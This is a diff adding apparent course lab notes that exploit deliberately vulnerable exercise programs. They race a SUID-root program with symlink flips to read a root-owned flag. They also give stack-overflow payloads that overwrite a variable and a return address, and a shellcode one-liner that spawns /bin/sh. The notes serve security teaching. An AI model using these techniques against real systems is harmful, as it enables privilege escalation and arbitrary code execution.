@@ -1,0 +1,180 @@
+Preliminaries
+
+Compile with:
+
+    make print_user_id
+
+Run with:
+
+    ./print_user_id
+
+
+One distinguishes between the real and the effective user id. 
+
+a) A real user id is always the id of the user that executes the program.
+
+b) The effective user id specifies which permissions the program actually has - which might be different.
+
+Exercise 1
+
+Utilise links, delays, ...
+
+flag.txt belongs to root and is therefore not readable by my user. I have to utilise the toctou program, so that I print the file flag.txt.
+
+Clarification:
+
+- We have the source (`toctou.c`) and can inspect it.
+- The key restriction is file permissions: `flag.txt` is root-owned and not readable by my real user id.
+- `toctou` is SUID root, so it runs with effective uid 0.
+- Bug: `access(path, R_OK)` checks with real uid, but `open(path, O_RDONLY)` uses effective uid.
+- If the pathname changes between check and use (TOCTOU race), the program can end up opening `flag.txt`.
+
+Key insight about the vulnerability:
+
+- If there were a 5-second delay between `access()` and `open()`, the exploit would be trivial: flip the symlink once and wait.
+- The real challenge is that there is NO artificial delay - we must win the race in the microsecond window between the two syscalls.
+- This is what makes it a genuine TOCTOU vulnerability: the kernel's inherent scheduling lets processes race.
+
+Working exploit approach:
+
+1) Create a symlink name (e.g., `victim_link`).
+2) In a tight, fast loop, continuously flip `victim_link` between `dummy_file.txt` (passes `access`) and `flag.txt` (used by `open`).
+3) Repeatedly execute `./toctou victim_link` in a loop until one run catches the window—without deliberate delays, relying on raw timing.
+
+Automated solver used:
+
+- Script: `solve_toctou.sh`
+- Run: `chmod +x solve_toctou.sh && ./solve_toctou.sh`
+- Example successful output:
+    - `[+] Success on attempt 137`
+    - `flag{success!}`
+
+
+Diego's solution is very short:
+
+two .sh scripts,
+
+1.) first one having a neverending while loop, which just runs the links switching continuously; run this one, and while it's running, run the...
+2.) second one, which just targets the target.txt file with ./toctou; it succeeds very quickly by exploiting the link between the two txt files (with different permissions)
+
+
+Exercise 2
+
+Part 1: Overflowing a Buffer
+
+overflow1.c
+
+Stack layout of vuln() (from objdump -M intel -d overflow1):
+
+    sub rsp, 0x30        <- allocates 48 bytes total
+    name at rbp-0x30     <- 32 bytes buffer
+    x    at rbp-0x8      <- uint64_t (8 bytes)
+
+    [rbp-0x30]  name[32]  ← read() writes here
+    [rbp-0x10]  8 bytes padding (alignment gap)
+    [rbp-0x08]  x (uint64_t, initialized to 0x42)
+    [rbp]       saved rbp
+    [rbp+0x08]  return address
+
+Distance from start of name to x: 0x30 - 0x08 = 0x28 = 40 bytes.
+
+The overflow: we write 40 bytes of junk to reach x, then overwrite it with
+0x1337 in little-endian (low byte first, because x86-64 is little-endian).
+
+    echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x37\x13\x00\x00\x00\x00\x00\x00" | ./overflow1
+
+Explanation:
+- 40 x 'A'  fills name[32] + 8 bytes of padding up to x
+- \x37\x13\x00\x00\x00\x00\x00\x00  is 0x1337 in little-endian (8 bytes)
+- The if-check (x == 0x1337) now passes and win() is called
+- We overflowed overflow1 by having 40 x 'A' (40 bytes), and we set x to 0x1337 (in little-endian), meaning that we exploit the program and overwrite it with what we want
+
+
+Part 2: Changing the Control Flow
+
+overflow2.c
+
+This time - because the program does not contain a call to win anymore - instead of overwriting a local variable, we need to overwrite the program's return address with the address of the function win. So at the end we want to have the same "Success!" output as in Part 1, indicating we ran the program as intended.
+
+
+
+Stack layout of vuln() (from objdump -M intel -d overflow2):
+
+    sub rsp, 0x20        <- allocates 32 bytes total
+    name at rbp-0x20     <- 32 bytes buffer, no other locals
+
+    [rbp-0x20]  name[32]  ← read() writes here
+    [rbp]       saved rbp (8 bytes)
+    [rbp+0x08]  return address  ← target: overwrite with address of win
+
+Distance from start of name to return address: 32 (name) + 8 (saved rbp) = 40 bytes.
+Address of win (from objdump): 0x401196.
+
+The overflow: 40 bytes of junk to reach the return address, then write win's
+address in little-endian so that when vuln() executes ret, it jumps to win().
+
+    echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x11\x40\x00\x00\x00\x00\x00" | ./overflow2
+
+Explanation:
+- 40 x 'A'  fills name[32] + 8 bytes of saved rbp
+- \x96\x11\x40\x00\x00\x00\x00\x00  is 0x401196 in little-endian (8 bytes)
+- When vuln() hits ret, the CPU loads the overwritten return address and
+  jumps directly to win(), printing "Success!"
+- The segfault afterwards is expected: win() returns to a corrupted stack,
+  but the goal was already achieved
+
+
+Bonus Part 3: Executing Shellcode
+
+overflow3.c
+
+This part, when executed, should open a shell inside a shell - as when the program is running, inside we can type any commands and it will work.
+
+This one isn't implemented fully, but we look at it during tommorow's lecture.
+
+
+
+Goal: no `win()` exists anymore, so we inject machine code (shellcode) into
+`name` and overwrite the return address to jump into that shellcode.
+
+Stack layout of vuln() (from objdump -M intel -d overflow3):
+
+    sub rsp, 0x20        <- allocates 32 bytes total
+    name at rbp-0x20     <- 32 bytes buffer
+
+    [rbp-0x20]  name[32]  ← read() writes here
+    [rbp]       saved rbp (8 bytes)
+    [rbp+0x08]  return address  ← overwrite target
+
+Distance from start of `name` to return address: 32 + 8 = 40 bytes.
+
+Because of `-z execstack`, stack is executable. We disable ASLR to keep
+addresses stable per setup:
+
+    setarch $(uname -m) -R ./overflow3
+
+The program prints the runtime address of `name`, e.g.:
+
+    name is located at 0x7fffffffdce0
+
+Use shellcode for:
+
+    execve("/bin/sh", ["/bin/sh", NULL], NULL)
+
+Payload structure:
+
+1) shellcode bytes
+2) padding until 40 bytes total
+3) 8-byte little-endian return address = printed `name` address
+
+Example one-liner exploit (replace address with your printed one):
+
+    (python3 -c 'import sys,struct; shell=(b"\x48\x31\xd2\x48\x31\xf6\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"); payload=shell+b"A"*(40-len(shell))+struct.pack("<Q",0x7fffffffdce0); sys.stdout.buffer.write(payload)'; cat) | setarch $(uname -m) -R ./overflow3
+
+Then run shell commands in the spawned shell, e.g. `id`, `whoami`, `exit`.
+
+Notes:
+- If it crashes, the jump address is likely wrong for that invocation.
+- Re-read the printed `name` address and rebuild payload with that exact value.
+- Keep invocation style consistent (same `setarch ... ./overflow3` form), since
+  stack addresses can differ if argv/env/pipeline shape differs.
